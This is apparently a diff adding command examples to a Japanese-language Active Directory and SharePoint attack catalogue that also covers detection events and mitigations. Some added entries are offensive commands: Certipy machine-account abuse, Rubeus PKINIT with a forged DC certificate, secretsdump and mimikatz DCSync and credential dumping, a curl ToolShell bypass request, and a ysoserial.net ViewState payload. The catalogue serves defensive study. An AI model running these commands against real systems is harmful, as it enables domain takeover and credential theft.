+        "t": "証明書ユーザーバインディングを既定のPrincipalName方式に設定/確認。高保証バインディングでなければSANの値だけでなりすましが完結する",
+        "q": "Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration -AuthenticationMethodConfigurationId X509Certificate -BodyParameter @{ '@odata.type'='#microsoft.graph.x509CertificateAuthenticationMethodConfiguration'; CertificateUserBindings=@(@{ X509CertificateField='PrincipalName'; UserProperty='userPrincipalName'; Priority=1 }) }"
+      }
+    ],
     "detect": "主信号はEntra監査ログ(AuditLogs)の\"Update authentication method configuration\"(対象X509Certificate、category Policy)で、certificateUserBindings/authenticationModeConfiguration/crlValidationConfigurationの変更を捕捉できる。CA信頼ストア自体の変更はこれとは別カテゴリで記録される: クラシック信頼ストア(/organization/.../certificateBasedAuthConfiguration)はUpdateが非サポートのためDELETE→CREATEのペアとして記録され、PKIベース信頼ストア(/directory/publicKeyInfrastructure/...)はPKIコンテナ・CAオブジェクト単位のCREATE/UPDATE/DELETEとして記録される。公式ドキュメントでは「PKIまたはCA上で実行したCRUD操作はすべてEntra監査ログに記録される」とされているが、活動名(activityDisplayName)の正確な文字列はテナントで実際に操作を再現して確認することを推奨する(本項の操作名パターンは代表例であり断定しない。特にクラシック信頼ストアはUpdateが存在しないため「Update trusted certificate authority」的な名称は実在しない可能性が高い)。イベント自体は追加CAの中身(公開鍵/Subject/CRL URL)を含まないため、変更検知時にMicrosoft Graphの該当APIを都度取得し、登録CA一覧(isRootAuthority/authorityType, certificate, crlDistributionPoint, issuerSubjectKeyIdentifier)とcertificateUserBindingsの優先順位をベースラインと突合する運用が実質必須となる。異常兆候は、組織の既知PKIルート一覧に無い発行者、crlDistributionPoint未設定のCA追加、crlValidationConfigurationの例外リストへの追加、証明書ユーザーバインディングの優先度が弱いUPN一致(PrincipalName)へ変更されたこと。サインイン側ではSigninLogs/EntraIdSignInEventsのAuthenticationDetails(dynamic配列。mv-expand推奨)内のauthenticationMethodに証明書ベース認証を示す値が現れるイベントを対象に、CA信頼ストア変更・ポリシー変更の直後に特権アカウントが新規デバイス・新規IPからCBAサインインしていないかを相関する。CA登録権限(Global Administrator/Privileged Authentication Administrator)とポリシー/バインディング変更権限(Authentication Policy Administrator)は別ロールであるため、片方のロール変更のみをPIM監視対象にしていると検知が漏れる。CBA信頼CA変更の監視自体をカバーしていないSOCが多く、変更操作そのものが検知網の外に置かれがちな点が本技法の核心的な検知ギャップである。",
     "events": "Entra AuditLogs: \"Update authentication method configuration\"(X509Certificate, category Policy: certificateUserBindings/authenticationModeConfiguration/crlValidationConfigurationの変更); クラシック信頼ストアのCA登録操作はDELETE→CREATEペア(certificateBasedAuthConfigurationはUpdate非サポート)としてDirectoryManagement相当カテゴリに記録、PKIベース信頼ストアはpublicKeyInfrastructure/certificateAuthoritiesへのCREATE/UPDATE/DELETEとして記録(正確なactivityDisplayNameは要現地検証) ※CA本体の値は含まれずGraph照会が別途必要; SigninLogs/EntraIdSignInEvents(AuthenticationDetails配列内のauthenticationMethodに証明書ベース認証を示す値。dynamic型のためmv-expand推奨); 操作端末側 4104(PowerShellスクリプトブロック: New-SelfSignedCertificate/Invoke-MgGraphRequest/New-MgOrganizationCertificateBasedAuthConfiguration等)、4688/Sysmon 1(openssl.exe実行)",
     "mitigate": "(1) CA信頼ストアを変更できるロール(Global Administrator、Privileged Authentication Administrator)と、認証方式ポリシー/バインディングを変更できるロール(Authentication Policy Administrator)をそれぞれ個別にPIMでJIT化し承認必須にする(両者は別ロールであり片方のみのJIT化では不十分)。(2) X509Certificate認証方式ポリシーのcrlValidationConfiguration.stateを\"enabled\"(管理センターの[CRL検証を必須にする])に設定し、CRL未設定のCAが発行した証明書での認証を既定で失敗させる。exemptedCertificateAuthoritiesSubjectKeyIdentifiersの例外リストへの追加は変更管理の承認対象とする。(3) certificateUserBindingsは可能な限り高保証のバインディング(SubjectKeyIdentifier、IssuerAndSerialNumber等)を優先度上位に設定し、単純なPrincipalName/RFC822Nameのみでのなりすましを困難にする。(4) \"Update authentication method configuration\"変更、およびcertificateBasedAuthConfiguration/publicKeyInfrastructureに対するCREATE/DELETE操作に即時アラートを設定し、Graph APIで取得した実CAリスト・バインディング設定を定期的にベースラインと差分照合する。(5) 条件付きアクセスでCBAサインインにもデバイス準拠/場所制限を課し、単体のCBA成立だけで機密リソースへ到達させない。(6) 既知のPKIルート/中間CAのみを許可するホワイトリスト運用とし、未承認CA追加を変更管理プロセスで捕捉する。(7) 可能であれば現行推奨のPKIベース信頼ストアへ移行し、クラシック信頼ストア(丸ごとDelete+Create方式)を無効化・CA除去することで、CA単位の細粒度な追跡・監査を可能にする。",
@@ -11972,6 +19469,38 @@ AD.I18N.ja.attacks = [
     "summary": "AD CSの証明書要求処理には、要求者に紐づくディレクトリオブジェクトを通常のLDAP解決で特定できない場合の「chase」フォールバックがあり、要求属性cdc(問い合わせ先ホスト)とrmd(解決対象の主体)を攻撃者が指定できてしまう認可不備(CVE-2026-54121)。標準ドメインユーザーが既定のms-DS-MachineAccountQuotaでコンピュータアカウントを作成し、ローグSMB/LDAP/LSAサービスを用意してCAからの認証チャレンジを実DCへNetlogon経由でリレーしつつ実在DCのobjectSid/dNSHostNameを返すだけで、CAにその身元解決結果を信頼させ既定のMachineテンプレート経由でDC名義の証明書を取得できる。取得した証明書でPKINIT認証しDCへなりすませば、DCのレプリケーション権限を使ったDCSyncでkrbtgtを含む全ドメインシークレットを窃取でき、管理者権限もユーザー操作も不要な低権限起点のフルドメイン侵害プリミティブとなる。",
     "how": "AD CSの証明書要求処理(ICertRequestD/certsrv)は、要求元に紐づくディレクトリオブジェクト(コンピュータアカウントのSID・dNSHostName・SPN等)を通常はカタログ済みのLDAPパスから即座に解決するが、解決に失敗した場合は「chase」と呼ばれるフォールバックに入り、要求に付随する補助属性cdc(問い合わせ先ホスト)とrmd(解決対象のマシン/プリンシパル)を手掛かりに追加の問い合わせを行う。CVE-2026-54121では、CAがcdcで指定されたホストを実在のドメインコントローラか検証しないまま追従してしまう不備があった(パッチ後は_ValidateChaseTargetIsDCがuserAccountControlのSERVER_TRUST_ACCOUNTフラグとSIDを検証)。攻撃者はまず標準ドメインユーザー資格情報と既定のms-DS-MachineAccountQuota(既定10)を使い新規コンピュータアカウントを作成し、自ホスト上にローグLSA・LDAP・SMB(ポート445/389)サービスを立て、cdc/rmdがそのホストを指すよう証明書要求を細工する。CAがchaseフォールバックでそのホストへ問い合わせに行くと、ローグサービスはCAが発する認証チャレンジをNetlogon経由で実在のDCへリレーして正規の応答を取り付けつつ、実DCのobjectSidとdNSHostNameを解決結果として返す。これによりCAは偽装された身元解決結果を正当なものとして信頼し、既定で全認証ユーザーにEnroll権限が残るMachineテンプレート経由でDC自身の身元情報を持つクライアント認証証明書を発行してしまう。この証明書を使いPKINIT(証明書ベースKerberos事前認証)を行うと、KDCは正規DCのマシンアカウント証明書として受理しTGTを発行するため、攻撃者はDCそのものになりすましたKerberosセッションを確立できる。DCへのなりすましが成立すれば、DCに付与されたDirectory Replication Service権限(Replicating Directory Changes / Replicating Directory Changes All)がそのまま使えるため、DRSUAPI経由のDCSyncでkrbtgtやドメイン管理者ハッシュを一括窃取しドメインを完全掌握できる。悪用の成立にはCAサーバーへのネットワーク到達性に加え、標準ドメインユーザー資格情報とコンピュータアカウント作成権限(既定のMachineAccountQuota)、CAからローグホストへのSMB/LDAP到達性が必須であり、管理者権限やフィッシング等のユーザー操作は不要だが、匿名アクセスのみで完結する攻撃ではない点に注意が必要である。",
     "tools": "Certipy, 攻撃者PoC『Certighost』(H0j3n/Aniq Fakhrul公開, ローグSMB/LDAP/LSAサービス+Netlogonリレーを実装), certreq.exe/certutil.exe, 自作ローグSMB/LDAP/LSAリスナー(impacket ntlmrelayx/ldapserver等を改変したNetlogonリレー実装), Rubeus(asktgt /certificate), PKINITtools(gettgtpkinit.py), impacket secretsdump.py(DCSync), mimikatz(kerberos::ptt, lsadump::dcsync)",
+    "cmd": [
+      {
+        "tool": "Certipy",
+        "t": "既定のMachineAccountQuotaで悪用起点となる不正コンピュータアカウントを作成。通常ユーザーの4741がこの攻撃連鎖で唯一の初動痕跡",
+        "q": "certipy account create -u 'victim@corp.local' -p 'Passw0rd!' -user 'ROGUEHOST$' -pass 'Passw0rd123!'"
+      },
+      {
+        "tool": "certreq.exe",
+        "t": "cdc/rmd属性を細工した登録要求はINF経由のcertreqが想定されるが公開PoC固有のCLI引数は未検証。標準INF登録要求としてCAとの通信自体を監視する",
+        "q": "certreq.exe -new request.inf request.req\ncertreq.exe -submit -config \"ca01.corp.local\\corp-CA\" request.req chase.cer"
+      },
+      {
+        "tool": "Certipy",
+        "t": "chaseフォールバックが偽装解決した身元でMachineテンプレートを申請。要求自体は正規のreq呼び出しと区別できずCA発行ログでの相関が必須",
+        "q": "certipy req -u 'ROGUEHOST$@corp.local' -p 'Passw0rd123!' -ca 'corp-CA' -template 'Machine'"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "偽装解決で発行されたDC名義証明書でPKINIT TGTを取得しセッションへ注入。4768のクライアント名が実在DCと一致するが送信元IPがDC以外である点が異常",
+        "q": "Rubeus.exe asktgt /user:DC01$ /certificate:chase.pfx /password:'Passw0rd123!' /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "取得したDC$のTGTでDCSyncを実行しkrbtgtを含む全ドメインシークレットを窃取。DC以外からのレプリケーション権限行使が最終確定シグナル",
+        "q": "export KRB5CCNAME=dc01.ccache\nsecretsdump.py -k -no-pass -just-dc corp.local/DC01\\$@dc01.corp.local"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "同じTGTをWindows側に注入しDCSyncする代替。`kerberos::ptt`と`lsadump::dcsync`の連続実行がDC以外の端末から発生する点が異常",
+        "q": "mimikatz.exe \"kerberos::ptt chase.kirbi\" \"lsadump::dcsync /domain:corp.local /user:krbtgt\" exit"
+      }
+    ],
     "detect": "CAサーバーでCertificate Services監査(4886/4887/4888)を有効化し、Machineテンプレートへの要求のRequesterが直近作成のコンピュータアカウント(4741由来)でないか照合する。証明書のSAN/セキュリティ拡張に記載されたDC名と実際のRequesterアカウントの不一致を突合する。CAサーバーからのアウトバウンドSMB(445, Netlogonリレー/chase解決)・LDAP(389)接続の宛先が既知DC/GCリストの範囲外であればアラート対象とする。発行された証明書によるPKINIT認証(4768、CertIssuerName/CertThumbprint/PreAuthType=16が記録)から直後にDCSync相当のレプリケーション要求(4662, GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 / 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)が続く場合は高確度で悪用と判定する。緊急暫定策としてchaseフォールバックをcertutil -setreg policy\\EditFlags -EDITF_ENABLECHASECLIENTDCで無効化した場合は、当該CA構成変更イベント(4885/4890等)も合わせて監視する。",
     "events": "4741(新規コンピュータアカウント作成), 4886/4887/4888(証明書要求受理/発行/拒否, Certification Authority監査), 4768(TGT要求、PreAuthType=16でPKINIT、CertIssuerName/CertThumbprint記録), 4662(Replicating Directory Changes GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2/1131f6ad-9c07-11d1-f79f-00c04fc2dcd2, DCSync), Sysmon 3(CAサーバーからの不審なSMB445/LDAP389アウトバウンド接続)",
     "mitigate": "2026-07-14公開のセキュリティ更新をCAサーバーへ最優先で適用する(パッチはchase解決先ホストのSERVER_TRUST_ACCOUNTフラグとSIDを検証する_ValidateChaseTargetIsDCを追加)。即時パッチ適用が困難な場合の緊急暫定策として、certutil -setreg policy\\EditFlags -EDITF_ENABLECHASECLIENTDC(マイナス指定で無効化)を実行しCertSvcを再起動してchaseフォールバック自体を無効化できるが、正規の登録フローを壊す可能性がありMicrosoftの検証もラボ限定のためあくまで一時措置とし、パッチ適用後は元に戻す。Machineテンプレートの既定Enroll権限からAuthenticated Usersを外し、必要なホストグループのみに限定するか、マネージャ承認を必須化する。ms-DS-MachineAccountQuotaを既定の10から0へ変更し標準ユーザーによる無制限のコンピュータアカウント作成を禁止する。CAサーバーの送信ネットワークを制限し、ドメイン内の既知DC/GC以外へのSMB(445)・LDAP(389)アウトバウンドを遮断してchaseフォールバックの悪用先を事実上封じる。Replicating Directory Changes / Replicating Directory Changes All権限をDCとAzure AD Connect等の許可済みサービスアカウントのみに限定し、DCSyncの発生元を継続監視する。",
@@ -12017,6 +19546,28 @@ AD.I18N.ja.attacks = [
     "summary": "認証済みだが無権限のドメインユーザーが、隣接ネットワークからDCのKDC(kdcsvc.dll、lsass.exeプロセス内でSYSTEM権限稼働)へ細工したチケット/PAC関連フィールドを送信し、整数オーバーフロー(CWE-190)によるヒープメモリ破壊を誘発してDC上での任意コード実行または権限昇格を狙うCritical RCE。既存のBronze Bit/RC4-MD4/etypeダウングレード等Kerberos系CVEがプロトコル仕様上の弱点(暗号ダウングレード・委任検証不備)を突くのに対し、本件はKDC実装そのもののメモリ安全性バグであり根本的に異なる攻撃クラスに属する。全ドメインの認証の心臓部を狙うため、単一の未パッチDCの存在がドメイン全体のリスクとなる。",
     "how": "前提として、攻撃者は有効なドメイン資格情報(追加特権は不要)を保有し、DCと同一/隣接ネットワークセグメントからTCP/UDP 88番のKDCへ到達可能である必要がある。AS-REQまたはTGS-REQに付随するチケット/認証データ関連フィールド(長さ・個数を示すカウント/サイズフィールド)を細工し、KDCがこれをバッファサイズ計算に用いる際に整数オーバーフロー/ラップアラウンド(CWE-190)を起こすよう仕向ける。オーバーフローにより意図より小さいヒープバッファが確保された後、外部から制御可能なサイズでデータコピーが行われヒープバッファオーバーフロー/メモリ破壊が発生する。kdcsvc.dllはlsass.exeプロセス内(SYSTEM権限)で稼働するため、悪用に成功すればDC上でSYSTEM権限の任意コード実行に至り、失敗すればlsass.exeクラッシュ、すなわちDCの予期せぬ再起動(サービス停止)を招く。ユーザー操作や事前の特権取得は不要で、KDCの認証処理そのものが攻撃対象面となる点で、通常のKerberos委任/暗号ダウングレード系脆弱性とは前提が異なる。確実なコード実行にはヒープ配置の事前グルーミングが必要になる可能性が高く、これがMicrosoft公開のCVSS基本値を7.1(攻撃条件がやや複雑[AC:H]、隣接ネットワーク前提[AV:A])に留めている一因と考えられるが、Microsoftは影響範囲(全DC、SYSTEM権限奪取)を踏まえ独自の深刻度ラベルとして「重大(Critical)」を付与している。脆弱性管理ではCVSS数値のみで優先度を下げず、ベンダー深刻度評価も併記して判断すべきである。Windows Server 2012~2025の全サポートバージョンのDCが影響を受ける。",
     "tools": "現時点(2026年7月)で公開PoCは確認されておらず、MSRC/Talos等のアドバイザリで技術詳細の一部が開示されているのみ。検証・研究用途ではWireshark(Kerberosディセクタでの手動パケット解析)、scapy(カスタムKerberos ASN.1パケット細工)、pyasn1/asn1c(不正なPAC/チケット構造の生成)、boofuzz等のプロトコルファジングツールが想定される。",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "現時点で公開PoCなし・パッチ未提供(2026年7月時点)。DC上のlsass.exe予期せぬクラッシュ/再起動の急増を一次シグナルとして監視する",
+        "q": "Get-WinEvent -LogName System -FilterXPath \"*[System[(EventID=1074 or EventID=41)]]\" -MaxEvents 50"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "KDCサービスクラッシュに伴う痕跡。SYSTEMプロセス(lsass)の異常終了ログをApplicationログで相関",
+        "q": "Get-WinEvent -LogName Application -FilterXPath \"*[System[(EventID=1000)] and EventData[Data='lsass.exe']]\""
+      },
+      {
+        "tool": "tshark",
+        "t": "TCP/UDP 88番のAS-REQ/TGS-REQ内チケット/認証データフィールドの異常サイズを事前検知するパケット解析が現状唯一の予防策",
+        "q": "tshark -f \"port 88\" -Y \"kerberos\" -i any"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ未公開のためGet-HotFixでの照合は無効。DCのビルド番号ベースラインを記録し将来の緊急パッチ適用と突合する",
+        "q": "Get-CimInstance Win32_OperatingSystem | Select-Object Version,BuildNumber,CSName"
+      }
+    ],
     "detect": "DC境界での88/tcp,udp向けKerberosトラフィックにおける異常な長さ/個数フィールド(プロトコル上想定される範囲を超えるcBuffers等)をネットワークIDS/IPSシグネチャで検知する。ホスト側ではKerberos-Key-Distribution-Center操作ログのデコードエラー/例外系イベント、SystemログのKDCサービスクラッシュ・再起動(7031/7034)、lsass.exeのWindows Error Reporting(Application 1000/1001)を監視する。単一送信元から同一DCへの反復的な異常パケット送信とその直後のクラッシュ/再起動の相関が悪用試行(ヒープグルーミングのリトライを含む)の強いシグナルとなる。",
     "events": "Kerberos-Key-Distribution-Center/Operational(デコードエラー系イベント), System 7031/7034(Kerberos Key Distribution Centerサービスの異常終了/再起動), Application 1000/1001(lsass.exeクラッシュ・WER), System 6008(予期しないシャットダウン), Security 4608/4609(システム起動/シャットダウン), Sysmon 1(lsass.exe再起動)",
     "mitigate": "Microsoftのセキュリティ更新プログラム公開後、全DC(特にWindows Server 2012~2025の全サポートバージョン)へ最優先で適用する。パッチ未公開の期間は、DCのKDCポート(88/tcp,udp)への到達をホストファイアウォール/ネットワークセグメンテーションで信頼できるクライアントセグメントのみに制限し、隣接ネットワークからの無差別な到達性を排除する。DCのクラッシュダンプ収集を有効化しlsass.exe/KDCサービスの異常終了を即時アラート化する。ベンダーのネットワークIDS/IPSシグネチャが提供され次第デプロイし、WSUS/SCCM等でDCのパッチ適用状況を継続的に可視化する。Credential Guard/VBSは事前のメモリ破壊自体を防がないが、悪用成功後の資格情報窃取被害の一部緩和に資する。",
@@ -12062,6 +19613,28 @@ AD.I18N.ja.attacks = [
     "summary": "AD DSがOutlookクライアントのグローバルアドレス一覧(GAL)参照用に実装するNSPI(Name Service Provider Interface, MS-NSPI)RPCサーバに境界チェック不足の固定長スタックバッファが存在し、ドメイン認証済みの一般ユーザーが細工したRPC要求を送るだけでDC上のディレクトリサービスプロセスをクラッシュさせ、条件が揃えばリモートコード実行によりSYSTEM権限を奪取できる。管理者権限も対話操作も不要で、認証さえ得ていれば任意のドメインユーザーが到達可能な攻撃面であるため、内部関係者や侵害済み低権限アカウントからDC完全掌握へ直結する。NSPIは既定でグローバルカタログ全台に有効なため、単一の侵害アカウントで全DC/GCが攻撃対象になる。",
     "how": "NSPIはOutlookクライアントがGALを参照するためDC/GC上で公開されるRPCインターフェース(UUID F5CC5A18-4264-101A-8C59-08002B2F8426)で、GCロール昇格時に既定で有効化され、エンドポイントマッパー(135/TCP)経由で動的ポートにバインドされる。攻撃者はドメイン内の任意の低権限アカウントでKerberos/NTLM認証を確立したうえでNspiBind()を呼び出しセッションコンテキストを取得する(NSPIは特権を要求しない一般利用者向けインターフェース)。続けてNspiGetProps/NspiQueryRows/NspiResolveNames等、可変長のプロパティタグ配列や文字列配列を引数に取るRPCメソッドに対し、要素数やオフセットフィールドを偽装した入力を送信する。サーバスタブ側で配列要素をパースする際、固定長のスタックバッファへ境界チェックなしでコピーする実装(CWE-121)が存在し、攻撃者が制御するデータで戻りアドレスやスタックカナリア領域を上書きできる。NTDSはドメインコントローラ上でlsass.exeプロセスに読み込まれて動作するため、この境界外書き込みはLSASSプロセス空間内で発生し、単純な入力でも即座にLSASSクラッシュ、すなわちWindowsの仕様上システム全体の強制再起動を招く。スタック/ヒープレイアウトを制御し戻りアドレスを乗っ取れれば、ユーザー操作なしにDC上でSYSTEM権限のコード実行に至り、任意ドメインユーザーからドメイン完全侵害(DCSync相当の権限)まで直結する。認証は必要だが特権グループ所属は不要なため、フィッシング等で侵害した一般ユーザーの資格情報のみで到達可能な点が本脆弱性の危険性を高めている。なお、Microsoftの公開情報(MSRC)は「NSPI RPCインターフェースへアクセス可能なドメイン認証済み攻撃者が、細工した入力によりディレクトリサービスプロセス内で境界外書き込みを誘発しメモリ破壊/RCEに至る」という粒度までを確認しており、具体的にどのRPCメソッド(opnum)が脆弱かはMicrosoftから公式には開示されていない(本記述はNSPIプロトコル設計上の妥当な技術的推定を含む)。",
     "tools": "PoCエクスプロイト(MSRC/SentinelOne等の脆弱性解説を起点とした研究者製PoC、非公開の場合はIDA Pro/Ghidra+WinDbgでのdrsuapi/NSPIスタブ差分解析。2026年7月時点でMSRC/Tenable共に「Publicly Disclosed: No, Known Exploits: None reported」であり公開PoCは確認されていない), Impacket(独自NSPIクライアント実装によるファジング/PoC送信), boofuzz/自作RPCファザー, WinDbg+LiveKernelReports(lsass.exeクラッシュダンプ解析), rpcdump.py/rpcmap.py(NSPIインターフェースUUID列挙・エンドポイント確認)",
+    "cmd": [
+      {
+        "tool": "rpcdump.py",
+        "t": "NSPIインターフェースの稼働・エンドポイント確認に使うImpacket偵察ツール。攻撃準備段階の列挙として観測されうる",
+        "q": "rpcdump.py corp.local/svc_user:'Passw0rd!'@10.0.0.10"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "現時点で公開PoCなし(2026年7月時点)。悪用試行はDC上のlsass.exeクラッシュ(NSPIサーバスタブのスタックオーバーフロー)として現れる",
+        "q": "Get-WinEvent -LogName System -FilterXPath \"*[System[(EventID=1074 or EventID=41)]]\" -MaxEvents 50"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "GC全台が既定でNSPI有効。エンドポイントマッパー(135/TCP)経由の動的ポートへの外部からの接続集中を監視する",
+        "q": "Get-NetTCPConnection -LocalPort 135 -State Established"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ未公開のためビルド番号を記録し、緊急パッチ公開後の適用状況突合に備える",
+        "q": "Get-CimInstance Win32_OperatingSystem | Select-Object Version,BuildNumber,CSName"
+      }
+    ],
     "detect": "RPCペイロード自体はSecurityログに残らないため、クラッシュ痕跡と異常RPCトラフィックの時系列相関が検知の主軸となる。DC上でlsass.exeクラッシュ(通常運用ではまず発生しない)を監視する。lsassは保護された重要プロセスのため、クラッシュは通常のサービス再起動ではなくOS全体のバグチェック(CRITICAL_PROCESS_DIED, 0xEF)経由の強制再起動として現れる点に注意し、Kernel-Power 41/System 6008(予期しないシャットダウン後の起動)とエンドポイントマッパー(135/TCP)への問い合わせ直後の予期しないDC再起動を関連付けて監視する。EDR/ETW(Microsoft-Windows-RPC)でlsass.exeへの異常なRPC着信や、WerFault.exeがlsass.exeを対象クラッシュとして起動するイベントを検知する。ネットワーク側ではRPCペイロードインスペクション対応IDS/ファイアウォールでNSPIインターフェースUUIDへの異常なサイズ・件数フィールドを持つパケットを検査する。",
     "events": "Application 1000/1001(WerFaultによるlsass.exeクラッシュレポート、フォールティングモジュールがntdsai.dll/rpcrt4.dll系), System 41(Kernel-Power, 正常シャットダウンを伴わない再起動=bugcheck痕跡)/6008(予期しない前回シャットダウン)/1074(再起動・シャットダウン要求元の記録), Bugcheck 0xEF(CRITICAL_PROCESS_DIED, 保護プロセスlsass.exeのクラッシュによるOS強制再起動)がlsassクラッシュ時の主な再起動シグナル。System 7031/7034(Active Directory Domain Servicesサービスの異常終了, Source=Service Control Manager)も記録され得るが、lsassは保護された重要プロセスのため多くの場合OSバグチェック経由の強制再起動が先行し7031/7034は必ずしも記録されない点に注意。Directory Serviceログ 1168系(NTDS内部異常), Security 4624(RPCバインド前提の認証イベント), RPCエンドポイントマッパー(135/TCP)アクセスに関するファイアウォール/ETW(Microsoft-Windows-RPC)ログ",
     "mitigate": "CVE-2026-45648対応セキュリティ更新プログラムを全DC/GCへ最優先で適用する。Exchange/Outlook GAL連携が不要な環境ではNSPIインターフェースを無効化するか、RPCフィルタ(netsh rpc filterまたはWFPベースのRPCフィルタリング)でNSPI UUID(F5CC5A18-4264-101A-8C59-08002B2F8426)へのアクセスをExchange/CASサーバ等の許可済みホストに限定する。RPCエンドポイントマッパー(135/TCP)および動的RPCポート範囲への到達性を信頼できるサブネットのみに制限し、DC/GCへの不要なネットワーク露出を最小化する。LSASS保護(Credential Guard, RunAsPPL/LSA Protection)を有効化し、クラッシュ時の異常終了を即時アラートするEDR/WERテレメトリを整備、パッチ適用までの一時的緩和としてGC以外のDCではNSPIを無効化する。",
@@ -12107,6 +19680,38 @@ AD.I18N.ja.attacks = [
     "summary": "SharePoint Server(オンプレ)のToolPane.aspxへの未認証パストラバーサル(CVE-2025-53771)とASP.NETデシリアライズ脆弱性(CVE-2025-53770)を連鎖させ未認証RCEを得る攻撃チェーン(通称ToolShell、2025年7月)。侵害後にASP.NET machineKey(ValidationKey/DecryptionKey)を窃取して偽造__VIEWSTATEペイロードを作成し、正規パッチ適用後もサーバ再侵害なしに持続的なコード実行・認証バイパスを維持する点が特徴。AD参加済みのSharePoint管理サーバを踏み台にした横展開・ランサムウェア配布(Storm-2603/Warlock、420台超侵害)に直結し、2026年7月にも後継ゼロデイ(CVE-2026-56164ほか)がKEV登載されるなど継続的な攻撃面。",
     "how": "前提: インターネットまたは内部から到達可能な未パッチのSharePoint Server 2016/2019/Subscription Edition(オンプレ、Server-to-Serverトラスト用ASP.NET machineKeyを保持)。侵害連鎖: (1) CVE-2025-53771(CVE-2025-49706のパッチをバイパスするパストラバーサル/Referer偽装)を用いて未認証でPOST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspxへ到達し、認証チェックを回避する(通称ToolShell)。(2) CVE-2025-53770(CVE-2025-49704のパッチバイパス版、ASP.NET非セキュアデシリアライズ)によりリクエストボディ内の細工されたシリアライズオブジェクトをデシリアライズさせ、w3wp.exe(SharePointアプリプールIDまたはSYSTEM相当)のコンテキストでコード実行を得る。(3) 実行直後にspinstall0.aspx等の軽量WebシェルをLAYOUTS配下に書き込み永続化するとともに、web.config/レジストリまたはIdentityModelのメモリ内リフレクションからASP.NET machineKey(ValidationKey/DecryptionKey、Server-to-Serverトラストやフォーム認証Cookieの署名/暗号化に使用)を窃取する。(4) 窃取したmachineKeyで任意の__VIEWSTATEペイロード(ysoserial.net等で生成)を偽造署名し、ToolPane.aspx以外の正規ページへPOSTするだけで、後日パッチが適用されmachineKeyが再生成されない限り持続的にコード実行・認証バイパスを維持できる(サーバ側の脆弱性パッチとは独立した永続化経路)。(5) 多くのSharePoint農場はドメイン参加済みの管理サーバであり、侵害後はLSASSダンプ/NTDS窃取や既存のKerberoasting・DCSync等の手法でAD内へ横展開し、Storm-2603によるWarlockランサムウェア配布(2025年7月、420台超が侵害確認)に至った実例がある。(6) 2026年7月には後継ゼロデイCVE-2026-56164(権限昇格)がCVE-2026-32201・CVE-2026-45659と共に実環境で悪用されCISA KEVに追加されており、パッチ適用済み環境でも新規の侵入経路として継続監視が必要。",
     "tools": "ToolShell PoC/exploit scripts, spinstall0.aspx web shell, ysoserial.net(VIEWSTATE偽造ペイロード生成), Burp Suite(Referer偽装リクエスト), mimikatz/procdump(LSASS窃取), Warlock ransomware, Impacket(secretsdump等での横展開), Metasploit(公開後の派生モジュール)",
+    "cmd": [
+      {
+        "tool": "curl",
+        "t": "未認証でToolPane.aspxへ到達しパストラバーサル/Referer偽装で認証チェックを回避する初弾。`DisplayMode=Edit`と`a=/ToolPane.aspx`の組合せが決定的シグナル",
+        "q": "curl -s -k -X POST 'https://sp.corp.local/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx' -H 'Referer: /_layouts/SignOut.aspx'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "侵害成功の一次証跡。TEMPLATE\\LAYOUTS配下に生成されるWebシェル`spinstall0.aspx`の存在確認(MS公式IOC)",
+        "q": "Get-ChildItem -Path 'C:\\\\Program Files\\\\Common Files\\\\microsoft shared\\\\Web Server Extensions\\\\16\\\\TEMPLATE\\\\LAYOUTS' -Filter spinstall0.aspx -Recurse"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "machineKey窃取の実行痕跡。w3wp.exeが生成するEncodedCommand付きPowerShellがspinstall0/LAYOUTSパスを参照する組合せがMS検知シグネチャの根拠",
+        "q": "powershell.exe -EncodedCommand <BASE64_PAYLOAD>"
+      },
+      {
+        "tool": "ysoserial.net",
+        "t": "窃取したASP.NET machineKey(ValidationKey/DecryptionKey)で偽造__VIEWSTATEペイロードを生成する定番ツール",
+        "q": "ysoserial.net.exe -p ViewState -g TypeConfuseDelegate -c \"whoami\" --validationalg=\"HMACSHA256\" --validationkey=<VALIDATIONKEY> --generator=<GENERATOR> --viewstateuserkey=<VIEWSTATEUSERKEY> --apppath=\"/\" --path=\"/_layouts/15/ToolPane.aspx\""
+      },
+      {
+        "tool": "PowerShell",
+        "t": "パッチ適用確認。SPSEはKB5002768、SharePoint 2019はKB5002754、2016はKB5002760の適用有無を照合",
+        "q": "Get-HotFix -Id KB5002768"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "AD参加済み管理サーバを踏み台にした横展開。侵害後の定番後続としてLSASSダンプからドメイン資格情報を窃取",
+        "q": "mimikatz.exe \"sekurlsa::logonpasswords\" exit"
+      }
+    ],
     "detect": "最重要シグナル: (1) IISログ(SharePointの15/16 hive配下 %ProgramFiles%\\Common Files\\Microsoft Shared\\Web Server Extensions\\*\\LOGS または IIS W3SVC)に、Referer偽装(/_layouts/SignOut.aspx等を伴う)付きのPOST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspxが200/302で記録される。(2) SharePoint LAYOUTSディレクトリ(特にLAYOUTS\\直下やbin配下)へのspinstall0.aspx等の新規.aspx書き込み(Sysmon EID11/DeviceFileEvents、親プロセスw3wp.exe)。(3) w3wp.exe(SharePointアプリプール, 多くはSPTimerV4/SharePoint-*系)がcmd.exe/powershell.exe/w3wp自身のUpdateフォルダ操作を子プロセス生成(4688/Sysmon1)。(4) 侵害後の痕跡として、Webシェルまたは注入コードがSystem.Web.dll/Microsoft.IdentityModel.dll等の「既にw3wp.exeにロード済みの」ASP.NETランタイムアセンブリへリフレクションでアクセスしmachineKeyを読み出す手口が使われるが、これらDLLは通常のSharePoint w3wp.exeでも起動時から常時ロードされているためSysmon Event ID 